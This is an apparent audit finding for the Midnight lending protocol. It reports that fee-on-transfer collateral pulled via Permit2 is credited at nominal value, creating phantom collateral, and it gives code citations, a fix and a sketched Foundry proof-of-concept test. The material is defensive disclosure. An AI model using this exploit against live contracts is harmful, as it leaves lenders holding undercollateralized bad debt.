### Title
Fee-on-Transfer Collateral via Permit2 Creates Phantom Collateral and Undercollateralized Borrow - (`src/periphery/MidnightBundles.sol` / `src/Midnight.sol`)

### Summary

`MidnightBundles.pullToken` passes the nominal `amount` to `IPermit2.permitTransferFrom` and then immediately forwards that same nominal value to `Midnight.supplyCollateral`. Neither `pullToken` nor `supplyCollateral` measures the actual token balance change. When the collateral token charges a transfer fee, two fee deductions occur across the two hops (borrower→bundler, bundler→Midnight), yet the position is credited with the full nominal amount. If the bundler holds a residual equal to the first-hop fee, the second `transferFrom` succeeds and Midnight's on-chain collateral record permanently exceeds the tokens it actually holds.

### Finding Description

**Exact code path:**

`supplyCollateralAndSellWithUnitsTarget` iterates over `collateralSupplies` and for each entry executes:

```
pullToken(token, msg.sender, collateralSupplies[i].assets, collateralSupplies[i].permit);   // line 136
forceApproveMax(token, MIDNIGHT);                                                             // line 137
IMidnight(MIDNIGHT).supplyCollateral(market, collateralSupplies[i].collateralIndex,
    collateralSupplies[i].assets, taker);                                                     // lines 138-139
``` [1](#0-0) 

Inside `pullToken`, the Permit2 branch calls:

```solidity
IPermit2(PERMIT2).permitTransferFrom(
    IPermit2.PermitTransferFrom(IPermit2.TokenPermissions(token, amount), nonce, deadline),
    IPermit2.SignatureTransferDetails(address(this), amount),
    from, signature
);
``` [2](#0-1) 

Permit2's `_safeTransferFrom` calls `transferFrom(borrower, bundler, A)` with no balance-delta check: [3](#0-2) 

A fee-on-transfer token deducts a fee in-flight, so the bundler receives `A - fee`, not `A`. `pullToken` returns without measuring the actual received amount.

`Midnight.supplyCollateral` then:
1. Credits the position with the full nominal `assets = A` **before** the transfer:
   ```solidity
   _position.collateral[collateralIndex] = UtilsLib.toUint128(oldCollateral + assets);
   ```
2. Calls `SafeTransferLib.safeTransferFrom(collateralToken, msg.sender, address(this), assets)` — a second fee-on-transfer deduction, so Midnight receives `A - fee` from the bundler. [4](#0-3) 

Neither step checks the actual balance delta. The position is credited with `A`; Midnight holds `A - fee`.

**Precondition enabling the transfer to succeed:** the bundler must hold a residual of at least `fee` tokens so that `transferFrom(bundler, midnight, A)` does not revert (bundler balance = `(A - fee) + fee = A`). After the call the bundler balance is zero and Midnight's balance increased by only `A - fee`.

**`isHealthy` uses the inflated on-chain value:**

```solidity
maxDebt += _position.collateral[i].mulDivDown(price, ORACLE_PRICE_SCALE)
               .mulDivDown(collateralParam.lltv, WAD);
``` [5](#0-4) 

`_position.collateral[i]` is `A`, not `A - fee`, so the health check passes for a borrow that is actually undercollateralized by `fee` tokens.

### Impact Explanation

The solvency invariant `tokenBalances[midnight][token] >= collateralSum(token)` is violated by exactly `fee` tokens per exploit execution. The borrower holds debt backed by phantom collateral. At maturity or liquidation, Midnight cannot transfer the full recorded collateral to the liquidator or borrower, causing a shortfall that is socialized as bad debt across lenders. The invariant is formally stated in `certora/specs/Solvency.spec`: [6](#0-5) 

### Likelihood Explanation

**Preconditions:**
1. A collateral token with a transfer fee must be listed in a market — no protocol-level check prevents this.
2. `MidnightBundles` must hold a nonzero residual of that token equal to at least the fee. This is a realistic steady-state condition: any prior partial execution, dust from rounding, or a deliberate attacker-seeded transfer can create it.
3. The borrower signs a Permit2 permit for amount `A` — fully attacker-controlled.

The exploit is repeatable: each execution consumes the residual but a new residual can be seeded for the next round. The attacker can also self-seed by sending `fee` tokens directly to the bundler before calling `supplyCollateralAndSellWithUnitsTarget`.

### Recommendation

In `MidnightBundles`, measure the actual balance received after `pullToken` and pass only that amount to `supplyCollateral`:

```solidity
uint256 balanceBefore = IERC20(token).balanceOf(address(this));
pullToken(token, msg.sender, collateralSupplies[i].assets, collateralSupplies[i].permit);
uint256 received = IERC20(token).balanceOf(address(this)) - balanceBefore;
forceApproveMax(token, MIDNIGHT);
IMidnight(MIDNIGHT).supplyCollateral(market, collateralSupplies[i].collateralIndex, received, taker);
```

Apply the same balance-delta pattern in `Midnight.supplyCollateral` itself (measure balance before/after the `safeTransferFrom` and use the delta for accounting) to close the vulnerability at the core layer regardless of caller.

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// FeeToken: charges `feeBps` basis points on every transferFrom.
contract FeeToken is ERC20 {
    uint256 public feeBps;
    constructor(uint256 _feeBps) ERC20("FeeToken","FT") { feeBps = _feeBps; }
    function transferFrom(address from, address to, uint256 amount) public override returns (bool) {
        uint256 fee = amount * feeBps / 10_000;
        super.transferFrom(from, to, amount - fee); // recipient gets amount-fee
        _burn(from, fee);                            // fee destroyed
        return true;
    }
}

contract FeeOnTransferCollateralTest is Test {
    // Deploy Midnight, MidnightBundles, Permit2, FeeToken as collateral.
    // Setup a market with FeeToken as collateral[0].
    // Seed midnightBundles with exactly `fee` FeeTokens (residual).
    // Borrower approves Permit2 for amount A, signs permit.
    // Borrower calls supplyCollateralAndSellWithUnitsTarget with CollateralSupply{assets: A, permit: permit2Permit}.

    function testPhantomCollateral() public {
        uint256 A = 1000e18;
        uint256 feeBps = 100; // 1%
        uint256 fee = A * feeBps / 10_000; // = 10e18

        // Seed bundler with exactly `fee` tokens (residual from prior tx).
        deal(address(feeToken), address(midnightBundles), fee);

        // Borrower has A tokens, approves Permit2.
        deal(address(feeToken), borrower, A);
        vm.prank(borrower); feeToken.approve(PERMIT2, A);

        // Build Permit2 permit for amount A.
        TokenPermit memory permit = _permit2(address(feeToken), borrower, A, 0, block.timestamp + 1);

        CollateralSupply[] memory supplies = new CollateralSupply[](1);
        supplies[0] = CollateralSupply({collateralIndex: 0, assets: A, permit: permit});

        vm.prank(borrower);
        midnightBundles.supplyCollateralAndSellWithUnitsTarget(
            targetUnits, 0, borrower, borrower, supplies, takes, 0, address(0)
        );

        uint128 credited = midnight.collateral(id, borrower, 0);
        uint256 midnightBalance = feeToken.balanceOf(address(midnight));

        // ASSERTION: credited == A but midnight only holds A - fee
        assertEq(credited, A,           "position credited full A");
        assertEq(midnightBalance, A - fee, "midnight holds only A-fee");
        // Invariant violated: credited > midnightBalance
        assertGt(credited, midnightBalance, "phantom collateral: solvency invariant broken");
    }
}
```

Expected: `credited = A`, `midnightBalance = A - fee`, `credited > midnightBalance`. The borrower's debt (from the subsequent `take`) is backed by `fee` tokens of phantom collateral, constituting undercollateralized bad debt.

### Citations

**File:** src/periphery/MidnightBundles.sol (L134-140)
```text
        for (uint256 i; i < collateralSupplies.length; i++) {
            address token = market.collateralParams[collateralSupplies[i].collateralIndex].token;
            pullToken(token, msg.sender, collateralSupplies[i].assets, collateralSupplies[i].permit);
            forceApproveMax(token, MIDNIGHT);
            IMidnight(MIDNIGHT)
                .supplyCollateral(market, collateralSupplies[i].collateralIndex, collateralSupplies[i].assets, taker);
        }
```

**File:** src/periphery/MidnightBundles.sol (L385-394)
```text
        } else if (permit.kind == PermitKind.Permit2) {
            (uint256 nonce, uint256 deadline, bytes memory signature) =
                abi.decode(permit.data, (uint256, uint256, bytes));
            IPermit2(PERMIT2)
                .permitTransferFrom(
                    IPermit2.PermitTransferFrom(IPermit2.TokenPermissions(token, amount), nonce, deadline),
                    IPermit2.SignatureTransferDetails(address(this), amount),
                    from,
                    signature
                );
```

**File:** test/vendor/Permit2.sol (L356-361)
```text
    function _safeTransferFrom(address token, address from, address to, uint256 amount) internal {
        (bool success, bytes memory returndata) = token.call(
            abi.encodeWithSelector(bytes4(keccak256("transferFrom(address,address,uint256)")), from, to, amount)
        );
        require(success && (returndata.length == 0 || abi.decode(returndata, (bool))));
    }
```

**File:** src/Midnight.sol (L531-545)
```text
        Position storage _position = position[id][onBehalf];
        uint256 oldCollateral = _position.collateral[collateralIndex];
        _position.collateral[collateralIndex] = UtilsLib.toUint128(oldCollateral + assets);

        if (oldCollateral == 0 && assets > 0) {
            uint128 newCollateralBitmap = _position.collateralBitmap.setBit(collateralIndex);
            _position.collateralBitmap = newCollateralBitmap;
            require(
                UtilsLib.countBits(newCollateralBitmap) <= MAX_COLLATERALS_PER_BORROWER, TooManyActivatedCollaterals()
            );
        }

        emit EventsLib.SupplyCollateral(msg.sender, id, collateralToken, assets, onBehalf);

        SafeTransferLib.safeTransferFrom(collateralToken, msg.sender, address(this), assets);
```

**File:** src/Midnight.sol (L954-955)
```text
                maxDebt += _position.collateral[i].mulDivDown(price, ORACLE_PRICE_SCALE)
                    .mulDivDown(collateralParam.lltv, WAD);
```

**File:** certora/specs/Solvency.spec (L162-163)
```text
strong invariant tokenBalanceCorrect(address token)
    tokenBalances[token][currentContract] >= collateralSum(token) + withdrawableSum(token) + claimableSettlementFee(token) - flashloans[token] - pendingFeeReceipt[token]
```
